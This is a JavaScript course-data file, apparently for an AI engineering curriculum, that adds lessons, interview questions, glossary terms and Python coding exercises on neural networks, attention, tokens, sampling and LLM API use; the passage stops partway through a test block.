// Curriculum update (docs/curriculum.md): the AI track as 18 modules taught over 10 weeks, each module ending
// with a build. Adds the new lessons, "Why it matters on the job" openers, more exercises (including
// "debug this" ones, marked debug: true, whose starter is buggy code to fix), interview questions, quiz
// items, projects and the module/week layout. Merged into AI by extendTrack after ai-zero.js, one call per
// module. Exercise keys are stable; new question ids start at q100 and quiz ids at x100.
// Exercise and body text avoid backslashes and dollar-brace sequences (they live in template literals).

// ---------------- Module 0: before you start / AI from zero ----------------
extendTrack(AI, {
  why: {
    "az-model": "Every AI feature you build calls a model that was trained months earlier. Knowing what training did, and what it can't do, tells you which problems prompts and data can fix.",
    "az-ml": "Teams ask AI engineers whether a model is good enough to ship. Baselines and held-out test data are how you answer with evidence instead of a demo.",
    "az-llm": "Made-up facts, answers that change between runs, confident mistakes: almost every LLM behaviour you'll debug follows from next-token prediction.",
    "az-tokens": "Your bill, your latency and your hard limits are all counted in tokens. Estimating them is daily work and a common screening question.",
    "az-api": "Most AI engineering is application code around an API call. Reading the response correctly (stop reason, usage) is the difference between a demo and a reliable feature.",
    toolkit: "Take-homes and portfolio projects are judged as repos: a reviewer clones yours, runs it from a terminal, and checks that no secret was ever committed.",
  },
  questions: [
    { id: "q100", topic: "toolkit", q: "How do you keep API keys and other secrets out of a codebase?", a: "Read them from environment variables at run time; locally from a .env file that .gitignore lists, in production from the platform's secrets manager. Commit a .env.example with names but no values, fail fast with a clear message when a key is missing, never log keys, and scan commits for secrets in CI." },
    { id: "q101", topic: "toolkit", q: "A teammate pushed an API key to a public repo an hour ago. What do you do?", a: "Revoke the key in the provider console immediately and issue a new one, then check the usage logs for abuse since the push. Removing the commit isn't enough: bots scrape public repos within minutes and the key stays in history. Afterwards add the file to .gitignore and a secret scanner to CI." },
    { id: "q102", topic: "toolkit", q: "Walk me through what happens at the HTTP level when your code calls a model API.", a: "The SDK sends a POST to the provider's URL with headers (content type JSON, the API key, a version header) and a JSON body (model, max_tokens, messages). The server replies with a status code (200, or 4xx for a bad request or key, 429 rate limited, 5xx server error), headers such as retry-after and a request ID, and a JSON body with content, stop reason and token usage." },
    { id: "q103", topic: "az-model", q: "What's the difference between training and inference, and which one does an AI engineer usually work on?", a: "Training adjusts a model's parameters on examples with known answers; inference runs the finished model on new inputs. Application AI engineers mostly work at inference time, calling trained models through an API or a local server, and shape behaviour with prompts, retrieval and tools; training or fine-tuning is the exception." },
    { id: "q104", topic: "az-model", q: "What are a model's parameters, and why does their count matter to you as an engineer?", a: "Parameters (weights) are the learned numbers inside a model. More parameters usually means more capability but also more memory, higher cost per token and higher latency, which is why you pick the smallest model that passes your evals and why self-hosting a 70B model needs serious GPUs." },
    { id: "q105", topic: "az-model", q: "What is a loss function?", a: "A number that measures how wrong a model's predictions are on training examples, such as squared error or cross-entropy. Training changes the parameters in the direction that lowers the loss; for LLMs the loss is how badly the model predicted each actual next token." },
    { id: "q106", topic: "az-ml", q: "Classification or regression: give an example of each from an AI product.", a: "Classification predicts a category: routing a support ticket to billing or tech, flagging an email as spam. Regression predicts a number: estimating a response's latency or a house price. LLM features often hide a classifier inside, like a router or a guardrail, and you measure it with precision and recall." },
    { id: "q107", topic: "az-ml", q: "What is overfitting and how do you spot it?", a: "The model learns its training examples, including their noise, instead of the general pattern, so it scores well on training data and badly on new data. You spot it by keeping a held-out test set and comparing scores; a large gap means overfitting." },
    { id: "q108", topic: "az-ml", q: "Why do you need a baseline before claiming a model works?", a: "A baseline (always predict the most common answer, or a simple rule) shows what you get for free. A 95% accurate model is unimpressive if 95% of cases share one label. Every improvement should be reported against it." },
    { id: "q109", topic: "az-llm", q: "Why does an LLM sometimes give a different answer to the same question?", a: "It samples the next token from a probability distribution rather than always taking the most likely one, so different runs can take different paths. Temperature controls how much; even at temperature 0, providers don't guarantee identical outputs. That's why you test with pass rates over several runs, not single examples." },
    { id: "q110", topic: "az-llm", q: "What's the difference between greedy decoding and sampling?", a: "Greedy decoding always picks the single most likely next token: repeatable but prone to dull, repetitive text. Sampling picks at random weighted by probability, which gives more varied, natural output; temperature, top-k and top-p control how adventurous it is." },
    { id: "q111", topic: "az-llm", q: "Why do LLMs hallucinate?", a: "They're trained to produce likely-sounding next tokens, not to check facts, so when the answer isn't in their training data or the prompt they still produce something fluent. Grounding answers in supplied sources, allowing 'I don't know', citations and evals reduce it." },
    { id: "q112", topic: "az-tokens", q: "What is a token and why should an engineer care?", a: "A chunk of text the model reads and writes, often a word or part of one (about 4 characters of English). Pricing, rate limits, latency and the context window are all measured in tokens, so they drive cost and what fits in a request." },
    { id: "q113", topic: "az-tokens", q: "What counts toward the context window?", a: "Everything in one request: system prompt, conversation history, documents, tool definitions and results, and the output the model writes. If input plus the space reserved for output exceeds the window, the request fails, so apps trim or summarize." },
    { id: "q114", topic: "az-tokens", q: "How does a chat app make a stateless model 'remember' the conversation?", a: "It stores the conversation and sends the relevant earlier messages again with each request. When the history gets too long it drops or summarizes the oldest turns, which is why long chats can forget early details." },
    { id: "q115", topic: "az-api", q: "What's in a chat API request and response?", a: "Request: the model name, max_tokens, an optional system prompt and the list of messages with roles. Response: content blocks (the text, or tool calls), a stop reason (finished, hit max_tokens, wants a tool) and token usage for billing." },
    { id: "q116", topic: "az-api", q: "A response's stop reason says max_tokens. What happened and what do you do?", a: "The answer was cut off at the output cap, so it may be incomplete or invalid JSON. Raise max_tokens, ask for a shorter answer, or continue the generation; never treat a truncated answer as complete." },
    { id: "q117", topic: "az-api", q: "How do you estimate what an LLM feature will cost per month?", a: "Tokens in and out per request times requests per month, priced per million tokens (output costs more). Add retries, multi-call flows such as agents, and caching discounts, then set spending limits and alerts in the provider console." },
  ],
  glossary: [
    ["Environment variable", "A named setting stored outside your code, in the terminal session or server; read in Python with os.environ."],
    ["Git", "A tool that records versions of a folder of code; a commit is one saved snapshot, GitHub hosts repositories online."],
    [".gitignore", "A file listing paths Git must never track, such as .env (secrets) and .venv/ (installed packages)."],
    ["HTTP header", "A labelled piece of extra information on a web request or response, such as content-type or retry-after."],
    ["Terminal", "A text window for typing commands (also called the command line or shell)."],
    ["Virtual environment", "A private folder of installed Python packages for one project, created with python -m venv."],
  ],
});

// ---------------- Module 1: fundamentals ----------------
extendTrack(AI, {
  topics: [
    {
      id: "neural", title: "Neural networks and attention, hands-on", short: "NN",
      why: "You won't train transformers in most AI engineering jobs, but interviewers ask you to explain them, and a working neuron, gradient step and attention step make that explanation concrete instead of memorized.",
      body: `<p><button class="link-btn inline-link" data-trgo="ai|learn|mlbasics">Machine learning fundamentals</button> treated a model as a black box. Here you build the three pieces inside an LLM, each small enough to run by hand: a neuron, one step of learning, and one step of attention.</p>
        <h3>A neuron</h3>
        <p>A <b>neuron</b> multiplies each input by a <b>weight</b>, adds them up, adds a <b>bias</b> (a number that shifts the result), and passes the total through an <b>activation function</b>. The most common activation is <b>ReLU</b>: negatives become 0, positives pass through (<code>max(0, x)</code>). Without an activation, stacking neurons would still only draw straight lines; the bend is what lets a network learn curves.</p>
        <p>Example: inputs [2, 3], weights [0.5, -1], bias 1. The weighted sum is 2 &times; 0.5 + 3 &times; (-1) + 1 = -1, and ReLU turns it into 0. A <b>layer</b> is many neurons reading the same inputs; a <b>network</b> is layers feeding layers. All the weights and biases together are the model's <b>parameters</b>.</p>
        <h3>Learning: loss and gradient descent</h3>
        <p>The <b>loss</b> measures how wrong the model is, for example the squared error (prediction - answer)&sup2;. The <b>gradient</b> says, for each parameter, which way and how steeply the loss changes if you nudge it. <b>Gradient descent</b> moves every parameter a small step downhill: <i>new = old - learning rate &times; gradient</i>. The <b>learning rate</b> is the step size: too small and training crawls, too big and it overshoots and the loss grows.</p>
        <p>Worked example: the model is <i>prediction = w &times; x</i>, one example has x = 2 and answer 6, and w starts at 1. The prediction is 2, the loss (2 - 6)&sup2; = 16, and the gradient of the loss with respect to w is 2 &times; (prediction - answer) &times; x = 2 &times; (-4) &times; 2 = -16. With a learning rate of 0.05, w becomes 1 - 0.05 &times; (-16) = 1.8. Repeat and w heads to 3, the value that makes the loss 0. In a deep network, <b>backpropagation</b> computes the gradient for every parameter at once using the chain rule; libraries such as PyTorch do it for you.</p>
        <h3>Attention in one step</h3>
        <p>Before attention, each token is turned into a vector (an <button class="link-btn inline-link" data-trgo="ai|learn|embeddings">embedding</button>). Then every token produces three vectors: a <b>query</b> (what it's looking for), a <b>key</b> (what it offers to others) and a <b>value</b> (the information it passes on). For one token:</p>
        <ol><li>Score every token: the dot product of this token's query with each key, divided by the square root of the vector length (<b>scaled</b> dot product, which stops scores growing with the vector size and saturating softmax).</li>
        <li>Turn the scores into weights that add up to 1 with <b>softmax</b> (see <button class="link-btn inline-link" data-trgo="ai|learn|sampling">Sampling in depth</button>).</li>
        <li>The output is the weighted sum of the value vectors: mostly information from the most relevant tokens.</li></ol>
        <p>In an LLM a token may only attend to itself and earlier tokens. That rule is the <b>causal mask</b>: it lets training predict every next token of a text in parallel without peeking at the answer. A <b>transformer block</b> is attention (several "heads" in parallel, each free to learn a different kind of relationship) followed by a small feed-forward network; an LLM stacks dozens of these blocks. Models like GPT and Claude are <b>decoder-only</b> transformers: masked attention all the way through.</p>`,
      example: `# One neuron, then gradient descent on one weight
def relu(x):
    return max(0, x)

inputs, weights, bias = [2, 3], [0.5, -1], 1
total = sum(x * w for x, w in zip(inputs, weights)) + bias
print("weighted sum:", total, "after ReLU:", relu(total))

w, x, answer, lr = 1.0, 2, 6, 0.05
for step in range(6):
    prediction = w * x
    loss = (prediction - answer) ** 2
    gradient = 2 * (prediction - answer) * x
    print("step", step, "w =", round(w, 3), "loss =", round(loss, 3))
    w = w - lr * gradient                     # one step downhill
`,
      exercises: [{
        key: "neuron", prompt: "Write neuron(inputs, weights, bias): multiply each input by its weight, add them up, add the bias, and apply ReLU (negative totals become 0).",
        example: "neuron([2, 3], [0.5, -1], 1) returns 0   (the total is -1)\nneuron([2, 3], [0.5, 1], 1) returns 5.0",
        hint: "`total = bias`, then `for x, w in zip(inputs, weights): total = total + x * w`. Return `max(0, total)`.",
        starter: `def neuron(inputs, weights, bias):
    pass
`,
        tests: `assert neuron([2, 3], [0.5, -1], 1) == 0, f"the total is -1, so ReLU gives 0; got {neuron([2, 3], [0.5, -1], 1)}"
assert neuron([2, 3], [0.5, 1], 1) == 5.0
assert neuron([], [], 0.5) == 0.5, "no inputs: just the bias"
assert neuron([1, 1], [-2, -2], 0) == 0`,
        solution: `def neuron(inputs, weights, bias):
    total = bias
    for x, w in zip(inputs, weights):
        total = total + x * w
    return max(0, total)`,
      }, {
        key: "gd-step", prompt: "Write gd_step(w, x, y, lr): one step of gradient descent for the model prediction = w × x with squared-error loss. The gradient is 2 × (w × x - y) × x; return w - lr × gradient.",
        example: "gd_step(1, 2, 6, 0.05) returns 1.8",
        hint: "Two lines: `gradient = 2 * (w * x - y) * x`, then `return w - lr * gradient`.",
        starter: `def gd_step(w, x, y, lr):
    pass
`,
        tests: `assert abs(gd_step(1, 2, 6, 0.05) - 1.8) < 1e-9, f"got {gd_step(1, 2, 6, 0.05)}"
assert gd_step(3, 2, 6, 0.05) == 3, "at the right answer the gradient is 0, so w stays put"
w = 0.0
for i in range(100):
    w = gd_step(w, 2, 6, 0.05)
assert abs(w - 3) < 1e-6, "repeated steps should reach 3"`,
        solution: `def gd_step(w, x, y, lr):
    gradient = 2 * (w * x - y) * x
    return w - lr * gradient`,
      }, {
        key: "attend", prompt: "Write attend(query, keys, values): scaled dot-product attention for one query. Score each key with dot(query, key) / sqrt(len(query)), turn the scores into weights with softmax (subtract the largest score before math.exp), and return the weighted sum of the value vectors as a list.",
        example: "attend([1, 0], [[1, 0], [1, 0]], [[10, 0], [0, 10]]) returns [5.0, 5.0]\n(identical keys get equal weights, so the output is the average of the values)",
        hint: "Scores: `[sum(q * k for q, k in zip(query, key)) / math.sqrt(len(query)) for key in keys]`. Softmax: `top = max(scores)`, `exps = [math.exp(s - top) for s in scores]`, weights are each exp divided by their sum. Then start `out = [0.0] * len(values[0])` and add `weight * v[i]` for each value vector.",
        starter: `import math

def attend(query, keys, values):
    pass
`,
        tests: `out = attend([1, 0], [[1, 0], [1, 0]], [[10, 0], [0, 10]])
assert all(abs(a - b) < 1e-9 for a, b in zip(out, [5.0, 5.0])), f"equal keys mean equal weights; got {out}"
out = attend([1, 0], [[1, 0], [0, 1]], [[10, 0], [0, 10]])
assert abs(out[0] - 6.6976) < 1e-3 and abs(out[1] - 3.3024) < 1e-3, f"got {out}"
out = attend([20, 0], [[20, 0], [0, 20]], [[1, 2], [7, 7]])
assert abs(out[0] - 1) < 1e-6 and abs(out[1] - 2) < 1e-6, "a much better match takes almost all the weight"`,
        solution: `import math

def attend(query, keys, values):
    scale = math.sqrt(len(query))
    scores = [sum(q * k for q, k in zip(query, key)) / scale for key in keys]
    top = max(scores)
    exps = [math.exp(s - top) for s in scores]
    total = sum(exps)
    out = [0.0] * len(values[0])
    for e, v in zip(exps, values):
        for i in range(len(v)):
            out[i] = out[i] + e / total * v[i]
    return out`,
      }, {
        key: "causal-mask", prompt: "Write causal_mask(n) returning an n × n list of lists of booleans: row i, column j is True when token i may attend to token j, that is when j is at or before i.",
        example: "causal_mask(3) returns\n[[True, False, False],\n [True, True, False],\n [True, True, True]]",
        hint: "A list comprehension inside a list comprehension: `[[j <= i for j in range(n)] for i in range(n)]`.",
        starter: `def causal_mask(n):
    pass
`,
        tests: `assert causal_mask(3) == [[True, False, False], [True, True, False], [True, True, True]], causal_mask(3)
assert causal_mask(1) == [[True]]
assert causal_mask(0) == []
assert sum(row.count(True) for row in causal_mask(4)) == 10, "4 + 3 + 2 + 1 allowed pairs"`,
        solution: `def causal_mask(n):
    return [[j <= i for j in range(n)] for i in range(n)]`,
      }, {
        key: "fix-descent", debug: true, prompt: "This training loop should fit prediction = w × x to one example, but w runs off towards infinity instead of settling on the answer. Find the bug and fix it so train(2, 6) returns (very nearly) 3.",
        example: "train(2, 6) returns 3.0000000000...\ntrain(1, -2, steps=200) returns -2.0000000...",
        hint: "Gradient descent goes downhill: the gradient points uphill, so you subtract it. Print w for the first few steps of the buggy version to see it grow.",
        starter: `def train(x, y, w=0.0, lr=0.05, steps=50):
    for step in range(steps):
        prediction = w * x
        gradient = 2 * (prediction - y) * x
        w = w + lr * gradient
    return w
`,
        tests: `assert abs(train(2, 6) - 3) < 1e-3, f"train(2, 6) should settle near 3, got {train(2, 6)}"
assert abs(train(1, -2, steps=200) + 2) < 1e-3
assert abs(train(2, 6, w=3.0) - 3) < 1e-9, "starting at the answer, nothing should move"`,
        solution: `def train(x, y, w=0.0, lr=0.05, steps=50):
    for step in range(steps):
        prediction = w * x
        gradient = 2 * (prediction - y) * x
        w = w - lr * gradient
    return w`,
      }],
      cards: [
        ["What does an activation function such as ReLU add?", "Non-linearity: without it, any stack of layers collapses into one straight-line function and can't learn curves."],
        ["Query, key, value: what does each do in attention?", "The query is what a token looks for, keys are what each token offers to be matched against, and values are the information that gets mixed into the output by the attention weights."],
        ["Your training loss gets bigger every step. Likely causes?", "The learning rate is too high (steps overshoot), or the update has the wrong sign (adding the gradient instead of subtracting it)."],
      ],
      videos: [V("aircAruvnKk", "But what is a neural network?", "3Blue1Brown"), IBM("jmmW0F0biz0", "Neural Networks Explained in 5 minutes"), V("eMlx5fFNoYc", "Attention in transformers, step-by-step", "3Blue1Brown")],
    },
  ],
  why: {
    mlbasics: "Interviewers use precision, recall and baselines to check you can judge quality, and you'll use them for every router, classifier and guardrail you ship.",
  },
  exercises: {
    mlbasics: [{
      key: "group-split", debug: true, prompt: "Messages from the same customer look alike, so when one customer's rows land in both train and test, the test score is inflated: that's data leakage. Fix split_by_customer so every customer is entirely in train or entirely in test: sort the distinct customer names, put the last round(number of customers × test_fraction) of them in test, and keep the original row order inside each list.",
      example: `rows from customers a, b, a, c, d, c with test_fraction 0.25:\ntest holds only customer d's row; train holds a, b, a, c, c`,
      hint: "Build `customers = sorted(set(r[\"customer\"] for r in rows))`, take `test_names = set(customers[len(customers) - n_test:])`, then loop over rows once and append each to train or test depending on whether its customer is in test_names. (Careful: `customers[-0:]` would be the whole list.)",
      starter: `def split_by_customer(rows, test_fraction):
    # rows: list of {"customer": name, "text": message}
    cut = int(len(rows) * (1 - test_fraction))
    return rows[:cut], rows[cut:]
`,
      tests: `rows = [{"customer": c, "text": str(i)} for i, c in enumerate(["a", "b", "a", "c", "d", "c"])]
train, test = split_by_customer(rows, 0.25)
assert {r["customer"] for r in train} & {r["customer"] for r in test} == set(), "no customer may appear in both"
assert [r["text"] for r in test] == ["4"], f"test should hold only customer d; got {[r['customer'] for r in test]}"
assert [r["text"] for r in train] == ["0", "1", "2", "3", "5"], "keep the original order"
train, test = split_by_customer(rows, 0.5)
assert sorted({r["customer"] for r in test}) == ["c", "d"]
train, test = split_by_customer(rows, 0)
assert test == [] and len(train) == 6`,
      solution: `def split_by_customer(rows, test_fraction):
    customers = sorted(set(r["customer"] for r in rows))
    n_test = round(len(customers) * test_fraction)
    test_names = set(customers[len(customers) - n_test:])
    train, test = [], []
    for r in rows:
        if r["customer"] in test_names:
            test.append(r)
        else:
            train.append(r)
    return train, test`,
    }],
  },
  questions: [
    { id: "q118", topic: "mlbasics", q: "What is data leakage and how do you prevent it?", a: "Information from the test set (or from the future) reaches training, so scores look better than real-world performance. Common causes: near-duplicates or the same user in both splits, features computed over the whole dataset, time-series split at random. Prevent it by splitting by group or by time before any processing, and by being suspicious of results that look too good." },
    { id: "q119", topic: "neural", q: "Explain self-attention to an engineer who hasn't studied ML.", a: "Each token makes a query and compares it, by dot product, with every token's key to get relevance scores; softmax turns the scores into weights that add to 1; the token's new representation is the weighted average of the tokens' value vectors. So each token pulls in information from the tokens most relevant to it. Many heads do this in parallel and dozens of layers stack it." },
    { id: "q120", topic: "neural", q: "What is gradient descent, and what happens when the learning rate is wrong?", a: "An optimization loop: compute the loss, compute each parameter's gradient (the direction that increases the loss), and step every parameter a little the other way. Too small a learning rate trains slowly or stalls; too large overshoots, so the loss bounces or diverges. Schedules and optimizers like Adam adapt the step." },
    { id: "q121", topic: "neural", q: "Why do decoder-only LLMs use a causal mask?", a: "Training predicts the next token at every position of a text in parallel. The mask stops each position attending to later tokens, which would leak the answer. The same rule makes generation left to right at inference, and it's what lets earlier tokens' keys and values be cached." },
  ],
  quiz: [
    { id: "x100", tags: [], topic: "neural", q: "In scaled dot-product attention, scores are divided by the square root of the vector length to:", options: ["Make the model smaller", "Keep scores from growing with the dimension so softmax doesn't saturate", "Remove the need for softmax", "Hide future tokens"], answer: 1, why: "Dot products grow with dimension; scaling keeps softmax in a range where gradients still flow." },
    { id: "x101", tags: [], topic: "neural", q: "A training loss that grows larger every step most likely means:", options: ["The learning rate is too high, or the update has the wrong sign", "The model has converged", "There's too little data", "The temperature is too low"], answer: 0, why: "Steps that overshoot (or go uphill) make the loss grow instead of shrink." },
  ],
  glossary: [
    ["Activation function", "The non-linear function a neuron applies to its weighted sum, such as ReLU (negatives become 0)."],
    ["Backpropagation", "The algorithm that computes the gradient of the loss for every parameter in a network, using the chain rule."],
    ["Causal mask", "The rule in an LLM's attention that a token can only look at itself and earlier tokens."],
    ["Data leakage", "Information from the test set or the future reaching training, so scores look better than real performance."],
    ["Gradient descent", "Training by repeatedly moving each parameter a small step in the direction that lowers the loss."],
    ["Learning rate", "The step size in gradient descent; too big overshoots, too small trains slowly."],
    ["Loss", "A number measuring how wrong a model's predictions are; training lowers it."],
    ["Neuron", "A weighted sum of inputs plus a bias, passed through an activation function."],
    ["Query, key, value", "The three vectors each token produces in attention: what it looks for, what it offers, and what it passes on."],
  ],
});

// ---------------- Module 2: how LLMs work ----------------
extendTrack(AI, {
  why: {
    foundations: "Hallucinations, outputs that change between runs, knowledge cutoffs and the cost of reasoning models all show up in production. This is the mental model you'll use to explain and fix them.",
    tokenization: "Long chats, big documents and agent loops all run out of context. Budgeting tokens and trimming history is code you'll write in every chat or agent app.",
    sampling: "Temperature and top-p are settings in every model API, and \"what does temperature do?\" is one of the most common screening questions.",
  },
  append: {
    foundations: `<h3>Post-training, in more detail</h3>
      <ul><li><b>Supervised fine-tuning (SFT):</b> training on example conversations written or approved by people, so the model learns to follow instructions and answer in a helpful format.</li>
      <li><b>Preference tuning:</b> people (or a model) compare two answers to the same prompt and mark the better one. <b>RLHF</b> trains a separate <i>reward model</i> on those pairs, then uses reinforcement learning to push the LLM toward answers the reward model scores highly. <b>DPO</b> (direct preference optimization) skips the reward model and trains directly on chosen-versus-rejected pairs.</li>
      <li><b>Reinforcement learning from verifiable rewards:</b> for maths and code the reward can be checked automatically (the answer is right, the tests pass). This is how <b>reasoning models</b> learn to work through long problems.</li></ul>
      <h3>Reasoning models</h3>
      <p>A <b>reasoning model</b> (or a model with <b>extended thinking</b>) writes out intermediate reasoning tokens before its final answer. It does much better on multi-step problems: maths, code, planning, tricky analysis. The trade-offs: thinking tokens are billed as output tokens and add latency, so you control them with a <b>thinking budget</b> (a token limit, which must fit inside max_tokens) or an <b>effort</b> setting. Use them where accuracy matters more than speed; use a fast model for simple extraction or classification. Don't add "think step by step" to a model that already reasons.</p>
      <h3>Prefill, decode and the KV cache</h3>
      <p>Generation has two phases. <b>Prefill</b> processes the whole prompt at once; <b>decode</b> then writes one token at a time. During decode, attention needs every earlier token's keys and values (see <button class="link-btn inline-link" data-trgo="ai|learn|neural">Neural networks and attention</button>), so the model stores them in a <b>KV cache</b> instead of recomputing them at each step. That's why the <b>time to first token</b> grows with prompt length while later tokens stream at a steady rate, and why long contexts and many simultaneous users fill GPU memory when you serve models yourself. Provider <b>prompt caching</b> is the same idea across requests.</p>`,
  },
  exercises: {
    foundations: [{
      key: "reasoning-budget", prompt: "Plan a request to a reasoning model. Write plan_request(window, input_tokens, thinking_budget, answer_tokens, in_price, out_price): max_tokens must cover the thinking budget plus the answer. Raise ValueError if the input plus max_tokens doesn't fit the window. Otherwise return (max_tokens, worst_case_cost) where thinking and answer tokens are both billed at the output price; prices are per million tokens.",
      example: "plan_request(200_000, 10_000, 8_000, 2_000, 3, 15) returns (10000, 0.18)\n(10,000 × 3 + 10,000 × 15, divided by 1,000,000)",
      hint: "`max_tokens = thinking_budget + answer_tokens`. Check `input_tokens + max_tokens > window` first. Cost: `(input_tokens * in_price + max_tokens * out_price) / 1_000_000`.",
      starter: `def plan_request(window, input_tokens, thinking_budget, answer_tokens, in_price, out_price):
    pass
`,
      tests: `mt, cost = plan_request(200_000, 10_000, 8_000, 2_000, 3, 15)
assert mt == 10_000 and abs(cost - 0.18) < 1e-9, (mt, cost)
mt, cost = plan_request(1000, 0, 0, 1000, 1, 1)
assert mt == 1000, "exactly full still fits"
try:
    plan_request(16_000, 9_000, 6_000, 2_000, 3, 15); raise SystemExit("expected ValueError: 9,000 + 8,000 is over 16,000")
except ValueError:
    pass`,
      solution: `def plan_request(window, input_tokens, thinking_budget, answer_tokens, in_price, out_price):
    max_tokens = thinking_budget + answer_tokens
    if input_tokens + max_tokens > window:
        raise ValueError("input plus max_tokens is over the context window")
    cost = (input_tokens * in_price + max_tokens * out_price) / 1_000_000
    return max_tokens, cost`,
    }, {
      key: "kv-cache", prompt: "Count the work a KV cache saves. Write kv_positions(prompt_len, new_tokens, cached): how many token positions get their keys and values computed while generating new_tokens tokens (at least 1) after a prompt. Without a cache, each step recomputes every position so far: the first step does prompt_len positions, the next prompt_len + 1, and so on. With a cache, the first step does the prompt once and each later step computes just 1 new position.",
      example: "kv_positions(4, 3, False) returns 15   (4 + 5 + 6)\nkv_positions(4, 3, True) returns 6    (4 + 1 + 1)",
      hint: "With a cache: `prompt_len + (new_tokens - 1)`. Without: add up `prompt_len + i` for i from 0 to new_tokens - 1 with a loop (or `sum(...)`).",
      starter: `def kv_positions(prompt_len, new_tokens, cached):
    pass
`,
      tests: `assert kv_positions(4, 3, False) == 15, f"got {kv_positions(4, 3, False)}"
assert kv_positions(4, 3, True) == 6
assert kv_positions(1000, 1, True) == kv_positions(1000, 1, False) == 1000, "one token: no difference"
assert kv_positions(1000, 500, False) == 624_750
assert kv_positions(1000, 500, True) == 1499`,
      solution: `def kv_positions(prompt_len, new_tokens, cached):
    if cached:
        return prompt_len + new_tokens - 1
    return sum(prompt_len + i for i in range(new_tokens))`,
    }, {
      key: "pref-pairs", prompt: "Build preference data for DPO. rated is a list of (prompt, response, score) tuples. Write preference_pairs(rated) returning one {\"prompt\", \"chosen\", \"rejected\"} dict per prompt, in the order prompts first appear: chosen is the highest-scored response, rejected the lowest (first one wins a tie). Skip prompts with only one response or where all scores are equal: they teach nothing.",
      example: `preference_pairs([("Hi?", "Hello!", 5), ("Hi?", "k", 1)]) returns\n[{"prompt": "Hi?", "chosen": "Hello!", "rejected": "k"}]`,
      hint: "Group first: `groups.setdefault(prompt, []).append((score, response))` (dicts keep insertion order). Then for each group, `max(items, key=lambda it: it[0])` and `min(...)` give the best and worst; skip when their scores are equal.",
      starter: `def preference_pairs(rated):
    pass
`,
      tests: `rated = [("Hi?", "Hello!", 5), ("Sum 2+2", "4", 5), ("Hi?", "k", 1), ("Sum 2+2", "5", 0), ("Hi?", "Hey", 3), ("Solo", "only one", 4), ("Tie", "a", 2), ("Tie", "b", 2)]
assert preference_pairs(rated) == [
    {"prompt": "Hi?", "chosen": "Hello!", "rejected": "k"},
    {"prompt": "Sum 2+2", "chosen": "4", "rejected": "5"},
], preference_pairs(rated)
assert preference_pairs([]) == []`,
      solution: `def preference_pairs(rated):
    groups = {}
    for prompt, response, score in rated:
        groups.setdefault(prompt, []).append((score, response))
    pairs = []
    for prompt, items in groups.items():
        best = max(items, key=lambda it: it[0])
        worst = min(items, key=lambda it: it[0])
        if best[0] != worst[0]:
            pairs.append({"prompt": prompt, "chosen": best[1], "rejected": worst[1]})
    return pairs`,
    }],
    tokenization: [{
      key: "trim-debug", debug: true, prompt: "trim_to_last should keep the newest max_messages messages (in order), then drop leading assistant messages so the history starts with a user turn. Users report that long chats 'forget' what they just said, and that a limit of 0 sends the whole history. Fix both bugs.",
      example: `history of u1, a1, u2, a2, u3 (u = user, a = assistant):\ntrim_to_last(history, 2) returns [u3]   (the last two are a2, u3; a2 is dropped)\ntrim_to_last(history, 3) returns [u2, a2, u3]`,
      hint: "Bug 1: `messages[:n]` takes the oldest messages. Bug 2: the fix `messages[-n:]` has its own trap, because `messages[-0:]` is the whole list. Compute the start position with `max(0, len(messages) - max_messages)` instead.",
      starter: `def trim_to_last(messages, max_messages):
    kept = messages[:max_messages]
    while kept and kept[0]["role"] != "user":
        kept.pop(0)
    return kept
`,
      tests: `h = [{"role": r, "content": c} for r, c in [("user", "u1"), ("assistant", "a1"), ("user", "u2"), ("assistant", "a2"), ("user", "u3")]]
got = [m["content"] for m in trim_to_last(h, 3)]
assert got == ["u2", "a2", "u3"], f"keep the newest messages; got {got}"
assert [m["content"] for m in trim_to_last(h, 2)] == ["u3"], "drop a leading assistant message"
assert trim_to_last(h, 0) == [], "a limit of 0 keeps nothing"
assert len(trim_to_last(h, 99)) == 5`,
      solution: `def trim_to_last(messages, max_messages):
    kept = messages[max(0, len(messages) - max_messages):]
    while kept and kept[0]["role"] != "user":
        kept.pop(0)
    return kept`,
    }],
    sampling: [{
      key: "top-p", prompt: "Write top_p_filter(probs, p) for nucleus (top-p) sampling: probs maps tokens to probabilities. Go through tokens from most to least likely, keeping them until their running total reaches at least p; then renormalize the kept probabilities so they add up to 1. Ties keep dictionary order.",
      example: `top_p_filter({"a": 0.5, "b": 0.3, "c": 0.15, "d": 0.05}, 0.75) returns {"a": 0.625, "b": 0.375}`,
      hint: "`ranked = sorted(probs.items(), key=lambda kv: kv[1], reverse=True)` (sorted is stable, so ties keep their order). Add tokens to a dict while tracking the running total, and `break` once it is `>= p`. Then divide each kept probability by the kept total.",
      starter: `def top_p_filter(probs, p):
    pass
`,
      tests: `probs = {"a": 0.5, "b": 0.3, "c": 0.15, "d": 0.05}
r = top_p_filter(probs, 0.75)
assert list(r) == ["a", "b"] and abs(r["a"] - 0.625) < 1e-9 and abs(r["b"] - 0.375) < 1e-9, r
assert list(top_p_filter(probs, 0.9)) == ["a", "b", "c"]
assert list(top_p_filter(probs, 0.1)) == ["a"], "the top token alone already covers p"
r = top_p_filter({"x": 0.2, "y": 0.6, "z": 0.2}, 1.0)
assert list(r) == ["y", "x", "z"] and abs(sum(r.values()) - 1) < 1e-9`,
      solution: `def top_p_filter(probs, p):
    ranked = sorted(probs.items(), key=lambda kv: kv[1], reverse=True)
    kept = {}
    total = 0
    for token, prob in ranked:
        kept[token] = prob
        total = total + prob
        if total >= p:
            break
    return {token: prob / total for token, prob in kept.items()}`,
    }, {
      key: "temp-zero", debug: true, prompt: "softmax_t crashes with ZeroDivisionError when a user sets temperature to 0, which APIs treat as 'always take the most likely token'. Fix it: at temperature 0, return a list with 1.0 for the highest logit (the first one, on ties) and 0.0 everywhere else. Other temperatures should behave as before.",
      example: "softmax_t([1, 3, 2], 0) returns [0.0, 1.0, 0.0]\nsoftmax_t([0, 0], 1) returns [0.5, 0.5]",
      hint: "Handle temperature 0 before dividing: find `best = logits.index(max(logits))` (index finds the first) and build the list with 1.0 at that position.",
      starter: `import math

def softmax_t(logits, temperature):
    scaled = [x / temperature for x in logits]
    top = max(scaled)
    exps = [math.exp(x - top) for x in scaled]
    total = sum(exps)
    return [e / total for e in exps]
`,
      tests: `assert softmax_t([1, 3, 2], 0) == [0.0, 1.0, 0.0], "temperature 0 is greedy"
assert softmax_t([5, 5, 1], 0) == [1.0, 0.0, 0.0], "ties go to the first"
r = softmax_t([0, 0], 1)
assert abs(r[0] - 0.5) < 1e-9 and abs(r[1] - 0.5) < 1e-9
hot, cold = softmax_t([1, 2], 2), softmax_t([1, 2], 0.5)
